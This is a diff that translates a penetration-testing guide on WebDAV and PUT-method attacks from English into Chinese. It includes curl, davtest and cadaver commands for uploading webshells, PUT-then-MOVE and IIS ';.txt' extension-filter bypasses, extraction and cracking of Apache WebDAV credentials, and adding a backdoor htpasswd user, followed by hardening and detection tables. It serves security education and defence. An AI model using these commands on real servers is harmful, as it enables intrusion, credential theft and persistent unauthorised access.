@@ -9,9 +9,9 @@ impact:
   - 权限提升
 risk_level: 高
 prerequisites:
-  - HTTP Methods (PUT, MOVE, DELETE, PROPFIND)
-  - HTTP Basic/Digest Authentication
-  - WebShell fundamentals
+  - HTTP 方法（PUT、MOVE、DELETE、PROPFIND）
+  - HTTP Basic/Digest 认证
+  - WebShell 基础
 related_techniques:
   - file-upload
   - brute-force
@@ -27,161 +27,160 @@ tools:
 
 # WebDAV & PUT Method — HTTP Write Access Attack Surface — WebDAV 与 PUT 方法攻击面分析
 
-> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [Brute Force](../../../Other%20Helpful%20Vulnerabilities/../../../generic-hacking/brute-force.md) · [IIS Security](../IIS/README.md) · [Apache Security](../Apache/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md)
+> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [IIS Security](../IIS/README.md) · [Apache Security](../Apache/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Brute Force](../../../hacktricks/src/generic-hacking/brute-force.md)
 
 ---
 
 ### 知识路径
 
 ```
-WebDAV & PUT Method (this document)
-  ├── Prerequisite: HTTP Methods — PUT, MOVE, DELETE, PROPFIND, OPTIONS
-  ├── Prerequisite: HTTP Authentication — Basic, Digest
-  ├── Next: IIS 6.0 WebDAV Parsing Bypass (;.txt suffix)
-  │   └── See: Web Servers & Middleware/IIS
-  ├── Next: POST-exploitation → credential harvesting in Apache configs
-  ├── Related: File Upload — general upload exploitation
-  │   └── See: Files/File Upload
-  ├── Related: Brute Force — WebDAV credential attacks
-  │   └── See: generic-hacking/brute-force
-  └── Related: WAF Bypass — extension filter evasion
-      └── See: Proxies/Proxy & WAF Protections Bypass
+WebDAV & PUT Method（本文档）
+  ├── 前置知识：HTTP 方法 — PUT、MOVE、DELETE、PROPFIND、OPTIONS
+  ├── 前置知识：HTTP 认证 — Basic、Digest
+  ├── 进阶：IIS 6.0 WebDAV 解析绕过（;.txt 后缀）
+  │   └── 参见：Web Servers & Middleware/IIS
+  ├── 进阶：后渗透 → Apache 配置中的凭据收集
+  ├── 关联：File Upload — 通用上传利用
+  │   └── 参见：Files/File Upload
+  ├── 关联：Brute Force — WebDAV 凭据攻击
+  └── 关联：WAF Bypass — 扩展名过滤器规避
+      └── 参见：Proxies/Proxy & WAF Protections Bypass
 ```
 
 ---
 
-# 0x01 WebDAV & PUT Method — Principles & Classification
+# 0x01 WebDAV 与 PUT 方法 — 原理与分类
 
-## 1.1 HTTP Methods & WebDAV Architecture
+## 1.1 HTTP 方法与 WebDAV 架构
 
-WebDAV (Web Distributed Authoring and Versioning) extends HTTP/1.1 with methods for distributed file management. When enabled on a web server, it allows authenticated clients to **create, modify, move, and delete** files on the server via standard HTTP verbs.
+WebDAV（Web Distributed Authoring and Versioning）通过用于分布式文件管理的方法扩展了 HTTP/1.1。当在 Web 服务器上启用时，它允许已认证客户端通过标准 HTTP 动词在服务器上**创建、修改、移动和删除**文件。
 
-**WebDAV-specific HTTP methods:**
+**WebDAV 专用 HTTP 方法：**
 
-| Method | Purpose | Attack Relevance |
-|--------|---------|-----------------|
-| `PUT` | Upload/create a file at the specified path | Direct webshell upload |
-| `MOVE` | Rename or relocate an existing file | Bypass upload extension filters |
-| `DELETE` | Remove a file | Defacement, anti-forensics |
-| `PROPFIND` | Retrieve resource properties | Directory listing, information disclosure |
-| `OPTIONS` | Discover supported methods | Reconnaissance — reveals WebDAV presence |
-| `COPY` | Duplicate a file to a new path | Bypass upload restrictions via copy+rename |
-| `MKCOL` | Create a directory | Create writable directories for staging |
+| 方法 | 用途 | 攻击相关性 |
+|------|------|----------|
+| `PUT` | 在指定路径上传/创建文件 | 直接上传 webshell |
+| `MOVE` | 重命名或重定位已有文件 | 绕过上传扩展名过滤器 |
+| `DELETE` | 删除文件 | 篡改、反取证 |
+| `PROPFIND` | 获取资源属性 | 目录列表、信息泄露 |
+| `OPTIONS` | 发现支持的方法 | 侦察 — 揭示 WebDAV 存在 |
+| `COPY` | 复制文件到新路径 | 通过复制+重命名绕过上传限制 |
+| `MKCOL` | 创建目录 | 创建可写目录用于分阶段部署 |
 
-**Server implementations:**
+**服务器实现：**
 
-| Server | WebDAV Module | Auth Type |
-|--------|-------------|-----------|
-| Apache httpd | `mod_dav` + `mod_dav_fs` | Digest (default), Basic |
-| IIS 5.0/6.0 | Native WebDAV | Windows Integrated, Basic |
-| IIS 7.0+ | WebDAV Extension Module | Windows Auth, Basic |
-| Nginx | Third-party (`nginx-dav-ext-module`) | Basic |
+| 服务器 | WebDAV 模块 | 认证类型 |
+|--------|-----------|---------|
+| Apache httpd | `mod_dav` + `mod_dav_fs` | Digest（默认）、Basic |
+| IIS 5.0/6.0 | 原生 WebDAV | Windows Integrated、Basic |
+| IIS 7.0+ | WebDAV Extension Module | Windows Auth、Basic |
+| Nginx | 第三方（`nginx-dav-ext-module`） | Basic |
 
-## 1.2 Attack Surface Taxonomy
+## 1.2 攻击面分类
 
-| Category | Taxonomy | Techniques |
-|----------|----------|------------|
-| Configuration Weakness | 配置缺陷 | WebDAV enabled without necessity; writable permissions on webroot; no IP restriction |
-| Authentication/Authorization Bypass | 认证/授权绕过 | Default/weak credentials; brute-force; PUT without auth on misconfigured servers |
-| Parsing Discrepancy | 协议解析差异 | IIS 5/6 `;.txt` suffix bypass — extension filter sees `.txt`, IIS parser executes `.asp` |
-| Injection | 注入类 | Webshell upload via PUT → RCE; MOVE rename to executable extension → code execution |
+| 类别 | 分类名称 | 技术 |
+|------|---------|------|
+| 配置缺陷 | 配置缺陷 | 无必要启用 WebDAV；webroot 可写权限；无 IP 限制 |
+| 认证/授权绕过 | 认证/授权绕过 | 默认/弱凭据；爆破；配置错误服务器上的无认证 PUT |
+| 协议解析差异 | 协议解析差异 | IIS 5/6 `;.txt` 后缀绕过 — 扩展名过滤器看到 `.txt`，IIS 解析器执行 `.asp` |
+| 注入类 | 注入类 | 通过 PUT 上传 webshell → RCE；MOVE 重命名为可执行扩展名 → 代码执行 |
 
 ---
 
-# 0x02 Reconnaissance & Exploitation Tooling
+# 0x02 侦察与利用工具
 
-## 2.1 DavTest — Automated Extension Testing
+## 2.1 DavTest — 自动化扩展名测试
 
-**Davtest** attempts to upload files with various extensions, then checks which extensions are executable on the server:
+**Davtest** 尝试上传各种扩展名的文件，然后检查哪些扩展名在服务器上是可执行的：
 
 ```bash
-# Upload .txt files and attempt to MOVE them to executable extensions
+# 上传 .txt 文件并尝试 MOVE 到可执行扩展名
 davtest [-auth user:password] -move -sendbd auto -url http://<IP>
 
-# Try to directly upload every known extension
+# 尝试直接上传每种已知扩展名
 davtest [-auth user:password] -sendbd auto -url http://<IP>
 ```
 
-**Output interpretation:**
+**输出解读：**
 
-[图片: DavTest output — Qwen extracted. Shows davtest against 10.11.1.229: server-side scripts (.jsp, .php, .cfm, .pl) all FAIL execution; .txt and .html SUCCEED as accessible files. Tool uploads files then checks if they execute — FAIL = server rejects code execution (good), SUCCEED = file accessible via web (not necessarily executed). Confirms warning: DavTest "SUCCEED" ≠ server-side code execution.]
+[图片: DavTest 输出 — Qwen 提取。展示对 10.11.1.229 的 davtest 扫描：服务端脚本（.jsp、.php、.cfm、.pl）全部 FAIL 执行；.txt 和 .html SUCCEED 表示文件可访问。工具上传文件后检查是否执行 — FAIL = 服务器拒绝代码执行（好），SUCCEED = 文件可通过 Web 访问（不一定被执行）。确认警告：DavTest "SUCCEED" ≠ 服务端代码执行。]
 
-> **Warning:** DavTest reporting an extension as "successful" only means the file is **accessible** through the web server — it does **not** guarantee server-side execution. Always manually verify by accessing the uploaded file and checking for code execution.
+> **警告：** DavTest 报告某扩展名 "successful" 仅意味着文件可通过 Web 服务器**访问** — 并**不**保证服务端执行。始终通过访问上传文件并检查代码执行来手动验证。
 
-## 2.2 Cadaver — Interactive WebDAV Client
+## 2.2 Cadaver — 交互式 WebDAV 客户端
 
-**Cadaver** provides an interactive command-line interface for WebDAV operations:
+**Cadaver** 提供交互式命令行界面用于 WebDAV 操作：
 
 ```
 cadaver <IP>
 ```
 
-Supports manual upload (`put`), move (`move`), delete (`delete`), and directory listing (`ls`) operations against the WebDAV server. Useful for step-by-step exploitation where automated tools are blocked or rate-limited.
+支持对 WebDAV 服务器进行手动上传（`put`）、移动（`move`）、删除（`delete`）和目录列表（`ls`）操作。适用于自动化工具被阻断或限速时的逐步利用。
 
-## 2.3 Raw HTTP with curl
+## 2.3 使用 curl 发送原始 HTTP
 
-### 2.3.1 PUT — Direct File Upload
+### 2.3.1 PUT — 直接文件上传
 
 ```bash
 curl -T 'shell.txt' 'http://$ip'
 ```
 
-The `-T` flag sends a PUT request with the file content. The target path must be writable and the method must be enabled.
+`-T` 标志发送带文件内容的 PUT 请求。目标路径必须可写且该方法必须启用。
 
-### 2.3.2 MOVE — Rename to Executable Extension
+### 2.3.2 MOVE — 重命名为可执行扩展名
 
 ```bash
 curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
 ```
 
-Upload a non-executable file (`.txt`) via PUT, then MOVE it to an executable extension (`.php`, `.asp`, `.aspx`, `.jsp`). This bypasses upload filters that check the extension of PUT-requested files.
+通过 PUT 上传非可执行文件（`.txt`），然后 MOVE 到可执行扩展名（`.php`、`.asp`、`.aspx`、`.jsp`）。这绕过了检查 PUT 请求文件扩展名的上传过滤器。
 
 ---
 
-# 0x03 Exploitation Techniques
+# 0x03 利用技术
 
-## 3.1 Direct PUT Upload → Webshell
+## 3.1 直接 PUT 上传 → Webshell
 
-### 3.1.1 Mechanism
+### 3.1.1 机制
 
-If the server has WebDAV enabled with write permissions and the target directory allows execution of uploaded file types, a webshell can be uploaded directly:
+如果服务器启用了具有写权限的 WebDAV，且目标目录允许执行上传的文件类型，可以直接上传 webshell：
 
 ```bash
-# Check if PUT is allowed
+# 检查 PUT 是否被允许
 curl -X OPTIONS http://$ip/ -I
 
-# Upload a simple PHP webshell
+# 上传简单的 PHP webshell
 curl -T 'shell.php' 'http://$ip/shell.php'
 
-# Upload an ASPX webshell
+# 上传 ASPX webshell
 curl -T 'shell.aspx' 'http://$ip/shell.aspx'
 ```
 
-### 3.1.2 Conditions
+### 3.1.2 条件
 
-- WebDAV enabled with write permissions on the target directory
-- Valid credentials (if authentication is required)
-- Target extension is allowed for upload and executed by the server
-- Directory is web-accessible
+- WebDAV 启用且目标目录具有写权限
+- 有效凭据（如果需要认证）
+- 目标扩展名被允许上传且被服务器执行
+- 目录可通过 Web 访问
 
-## 3.2 MOVE Rename Bypass
+## 3.2 MOVE 重命名绕过
 
-### 3.2.1 Mechanism
+### 3.2.1 机制
 
-When the server blocks direct upload of executable extensions (`.php`, `.asp`, `.aspx`) but allows non-executable ones (`.txt`, `.html`), a two-step bypass works:
+当服务器阻止直接上传可执行扩展名（`.php`、`.asp`、`.aspx`）但允许非可执行扩展名（`.txt`、`.html`）时，两步绕过有效：
 
-1. **PUT** a webshell with a benign extension (`.txt`)
-2. **MOVE** the uploaded file to an executable extension (`.php`)
+1. **PUT** 上传带良性扩展名（`.txt`）的 webshell
+2. **MOVE** 将上传文件重命名为可执行扩展名（`.php`）
 
 ```bash
-# Step 1: Upload webshell as .txt
+# 步骤 1：以 .txt 上传 webshell
 curl -T 'shell.php' 'http://$ip/shell.txt'
 
-# Step 2: Rename to executable extension
+# 步骤 2：重命名为可执行扩展名
 curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
 ```
 
-### 3.2.2 Cadaver Equivalent
+### 3.2.2 Cadaver 等效操作
 
 ```
 cadaver <IP>
@@ -189,45 +188,45 @@ cadaver <IP>
 > move shell.txt shell.php
 ```
 
-## 3.3 IIS 5/6 WebDAV — `;.txt` Parsing Bypass
+## 3.3 IIS 5/6 WebDAV — `;.txt` 解析绕过
 
-### 3.3.1 Mechanism
+### 3.3.1 机制
 
-IIS 5.0 and 6.0 WebDAV implementations have a **parsing flaw**: the upload filter blocks files ending with `.asp`, but adding `;.txt` (or `;.html`) as a **suffix** causes the filter to see `.txt` while the IIS parser sees `.asp`:
+IIS 5.0 和 6.0 的 WebDAV 实现存在**解析缺陷**：上传过滤器阻止以 `.asp` 结尾的文件，但添加 `;.txt`（或 `;.html`）作为**后缀**使过滤器看到 `.txt`，而 IIS 解析器看到 `.asp`：
 
 ```
-filename.asp;.txt  →  upload filter: allowed (.txt extension)
-                   →  IIS parser:     executed as ASP (.asp before semicolon)
+filename.asp;.txt  →  上传过滤器：允许（.txt 扩展名）
+                   →  IIS 解析器：   作为 ASP 执行（分号前的 .asp）
 ```
 
-### 3.3.2 Exploitation Steps
+### 3.3.2 利用步骤
 
-1. Upload the ASP webshell as `shell.asp;.txt` via PUT
-2. Or: upload as `shell.txt` → MOVE to `shell.asp;.txt`
-3. Access via browser: `http://target/shell.asp;.txt`
+1. 通过 PUT 以上传 ASP webshell：`shell.asp;.txt`
+2. 或：以 `shell.txt` 上传 → MOVE 到 `shell.asp;.txt`
+3. 通过浏览器访问：`http://target/shell.asp;.txt`
 
-[图片: IIS5/6 WebDAV cadaver exploitation — Qwen extracted. Shows full IIS semicolon bypass attack: (1) `put reverse.txt` succeeds uploading raw webshell, (2) `copy reverse.txt reverse.asp;.txt` succeeds — the `;.txt` suffix bypasses IIS extension filter (server sees `.txt`, parser executes as `.asp`), (3) `move reverse.txt reverse2.asp;.txt` fails with 401 Unauthorized but `ls` confirms `reverse2.asp;.txt` EXISTS — validates source note that cadaver reports failure incorrectly, (4) background window shows `nc -lvnp 80` receiving a connection and `whoami` returning `nt authority\system` — successful shell on a separate target.]
+[图片: IIS5/6 WebDAV cadaver 利用 — Qwen 提取。展示完整的 IIS 分号绕过攻击：(1) `put reverse.txt` 成功上传原始 webshell，(2) `copy reverse.txt reverse.asp;.txt` 成功 — `;.txt` 后缀绕过 IIS 扩展名过滤器（服务器看到 `.txt`，解析器作为 `.asp` 执行），(3) `move reverse.txt reverse2.asp;.txt` 失败返回 401 Unauthorized 但 `ls` 确认 `reverse2.asp;.txt` 存在 — 验证了源中 cadaver 错误报告失败的说明，(4) 后台窗口显示 `nc -lvnp 80` 接收连接且 `whoami` 返回 `nt authority\system` — 在另一目标上成功获得 shell。]
 
-> **Note:** Cadaver may report that the MOVE action did not work — **ignore this**. The file is moved successfully on the server side despite the client-side error message. Verify by accessing the file URL directly.
+> **注意：** Cadaver 可能报告 MOVE 操作未成功 — **忽略此报告**。文件在服务端实际成功移动，尽管客户端显示错误消息。通过直接访问文件 URL 验证。
 
-### 3.3.3 Conditions
+### 3.3.3 条件
 
-- IIS 5.0 or 6.0 (the parsing bug is fixed in IIS 7.0+)
-- WebDAV enabled
-- Valid credentials with write access
-- ASP is enabled as a server-side script handler
+- IIS 5.0 或 6.0（解析漏洞在 IIS 7.0+ 中已修复）
+- WebDAV 已启用
+- 具有写访问权限的有效凭据
+- ASP 已启用为服务端脚本 Handler
 
-This vulnerability is also documented in [IIS Security](../IIS/README.md) §4.4 (IIS 6.0 Parsing-Based Access Bypass) and relates to the same semicolon parsing behavior that enables [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) in mixed IIS + proxy deployments.
+此漏洞也在 [IIS Security](../IIS/README.md) §4.4（IIS 6.0 基于解析的访问绕过）中记录，且与在混合 IIS + 代理部署中启用 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) 的相同分号解析行为相关。
 
 ---
 
-# 0x04 Post-Exploitation & Credential Harvesting
+# 0x04 后渗透与凭据收集
 
-## 4.1 Apache WebDAV Configuration Extraction
+## 4.1 Apache WebDAV 配置提取
 
-### 4.1.1 Locating WebDAV Configuration
+### 4.1.1 定位 WebDAV 配置
 
-After gaining shell access on an Apache server with WebDAV, check site configurations:
+在具有 WebDAV 的 Apache 服务器上获得 shell 访问后，检查站点配置：
 
 ```bash
 # Debian/Ubuntu
@@ -237,9 +236,9 @@ cat /etc/apache2/sites-enabled/000-default
 cat /etc/httpd/conf.d/webdav.conf
 ```
 
-### 4.1.2 Configuration Analysis
+### 4.1.2 配置分析
 
-Typical WebDAV configuration block:
+典型的 WebDAV 配置块：
 
 ```
 ServerAdmin webmaster@localhost
@@ -252,30 +251,30 @@ ServerAdmin webmaster@localhost
                 Require valid-user
 ```
 
-### 4.1.3 Credential File Extraction
+### 4.1.3 凭据文件提取
 
-The `AuthUserFile` directive points to the credentials file:
+`AuthUserFile` 指令指向凭据文件：
 
 ```
 /etc/apache2/users.password
 ```
 
-This file contains **usernames** and **password hashes** for WebDAV authentication. Extract and crack them:
+此文件包含 WebDAV 认证的**用户名**和**密码哈希**。提取并破解：
 
 ```bash
-# View credentials file
+# 查看凭据文件
 cat /etc/apache2/users.password
 
-# Example format: username:realm:hash
-# Crack with hashcat (mode depends on AuthType):
+# 示例格式：username:realm:hash
+# 使用 hashcat 破解（模式取决于 AuthType）：
 #   Digest: hashcat -m 1600
-#   Basic:  hashcat -m 0 (if htpasswd with MD5/APR1/Bcrypt)
+#   Basic:  hashcat -m 0（如果是 htpasswd 的 MD5/APR1/Bcrypt 格式）
 
-# Add a new WebDAV user (backdoor persistence)
-htpasswd /etc/apache2/users.password <USERNAME>  # Prompts for password
+# 添加新的 WebDAV 用户（后门持久化）
+htpasswd /etc/apache2/users.password <USERNAME>  # 提示输入密码
 ```
 
-### 4.1.4 Verify New Credentials
+### 4.1.4 验证新凭据
 
 ```bash
 wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
@@ -283,47 +282,47 @@ wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
 
 ---
 
-# 0x05 Defense, Hardening & Tools
+# 0x05 防御、加固与工具
 
-## 5.1 Hardening Checklist
+## 5.1 加固检查表
 
-| Action | Rationale |
-|--------|-----------|
-| Disable WebDAV if not required (`DAV Off` in Apache; remove WebDAV role in IIS) | Eliminates entire attack surface |
-| Restrict WebDAV to authenticated users only (`Require valid-user`) | Prevents anonymous write access |
-| Use strong, unique passwords; enforce account lockout after N failed attempts | Mitigates brute-force attacks |
-| Restrict writable directories to non-executable locations | Even if webshell is uploaded, it cannot execute |
-| Set `LimitRequestBody` and `LimitXMLRequestBody` to reasonable values | Prevents large file uploads / DoS |
-| Restrict file extensions: only allow `.txt`, `.pdf`, `.doc` — never `.php`, `.asp`, `.jsp` | Prevents executable webshell upload |
-| Use IP whitelisting for WebDAV access (`Allow from` / `Require ip`) | Limits exposure to trusted networks |
-| Audit `AuthUserFile` permissions: `chmod 640`, owned by root | Prevents credential file read by web server user |
-| Monitor PUT/MOVE/DELETE requests in access logs | Detects exploitation in progress |
-| Apply IIS patches: the IIS 5/6 `;.txt` bypass is not present in IIS 7.0+ | Version upgrade eliminates parsing bug |
+| 措施 | 理由 |
+|------|------|
+| 如不需要，禁用 WebDAV（Apache 中 `DAV Off`；IIS 中移除 WebDAV 角色） | 消除整个攻击面 |
+| 仅限认证用户访问 WebDAV（`Require valid-user`） | 防止匿名写访问 |
+| 使用强唯一密码；在 N 次失败尝试后执行账户锁定 | 缓解爆破攻击 |
+| 将可写目录限制在不可执行的位置 | 即使 webshell 被上传，也无法执行 |
+| 将 `LimitRequestBody` 和 `LimitXMLRequestBody` 设置为合理值 | 防止大文件上传/DoS |
+| 限制文件扩展名：仅允许 `.txt`、`.pdf`、`.doc` — 绝不包含 `.php`、`.asp`、`.jsp` | 防止可执行 webshell 上传 |
+| 对 WebDAV 访问使用 IP 白名单（`Allow from` / `Require ip`） | 限制暴露给可信网络 |
+| 审计 `AuthUserFile` 权限：`chmod 640`，属主为 root | 防止 Web 服务器用户读取凭据文件 |
+| 在访问日志中监控 PUT/MOVE/DELETE 请求 | 检测进行中的利用 |
+| 应用 IIS 补丁：IIS 5/6 的 `;.txt` 绕过在 IIS 7.0+ 中不存在 | 版本升级消除解析漏洞 |
 
-## 5.2 Detection Telemetry
+## 5.2 检测指标
 
-| Indicator | Significance |
-|-----------|--------------|
-| `OPTIONS` request returning `PUT, MOVE, DELETE, PROPFIND` | WebDAV reconnaissance |
-| `PUT` request with `.txt` extension followed by `MOVE` to `.php`/`.asp` | Two-step extension bypass |
-| `PUT` request with filename containing `;.txt` or `;.html` | IIS 5/6 WebDAV bypass |
-| Multiple failed `PUT` attempts with different credentials | Credential brute-force |
-| New files appearing in webroot outside deployment window | Successful webshell upload |
-| Access to `/etc/apache2/users.password` from web server process | Credential theft |
+| 指标 | 意义 |
+|------|------|
+| `OPTIONS` 请求返回 `PUT, MOVE, DELETE, PROPFIND` | WebDAV 侦察 |
+| 带 `.txt` 扩展名的 `PUT` 请求后跟到 `.php`/`.asp` 的 `MOVE` | 两步扩展名绕过 |
+| 文件名包含 `;.txt` 或 `;.html` 的 `PUT` 请求 | IIS 5/6 WebDAV 绕过 |
+| 使用不同凭据的多次失败 `PUT` 尝试 | 凭据爆破 |
+| 部署窗口之外 webroot 中出现新文件 | 成功的 webshell 上传 |
+| Web 服务器进程访问 `/etc/apache2/users.password` | 凭据窃取 |
 
-## 5.3 Tools Inventory
+## 5.3 工具清单
 
-| Tool | Purpose | Reference |
-|------|---------|-----------|
-| `davtest` | Automated WebDAV extension testing | Built-in Kali |
-| `cadaver` | Interactive WebDAV client | Built-in Kali |
-| `curl` | Raw HTTP PUT/MOVE/DELETE | Built-in |
-| `hydra` | WebDAV credential brute-force | Built-in Kali |
-| `htpasswd` | Apache credential file manipulation | Built-in |
+| 工具 | 用途 | 参考 |
+|------|------|------|
+| `davtest` | 自动化 WebDAV 扩展名测试 | Kali 内置 |
+| `cadaver` | 交互式 WebDAV 客户端 | Kali 内置 |
+| `curl` | 原始 HTTP PUT/MOVE/DELETE | 内置 |
+| `hydra` | WebDAV 凭据爆破 | Kali 内置 |
+| `htpasswd` | Apache 凭据文件操控 | 内置 |
 
 ## 参考资料
 
 - [vk9-sec — Exploiting WebDAV](https://vk9-sec.com/exploiting-webdav/)
 - [HackTricks — WebDAV](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
-- [Apache mod_dav Documentation](https://httpd.apache.org/docs/2.4/mod/mod_dav.html)
+- [Apache mod_dav 文档](https://httpd.apache.org/docs/2.4/mod/mod_dav.html)
 - [Microsoft IIS WebDAV Extension](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/)
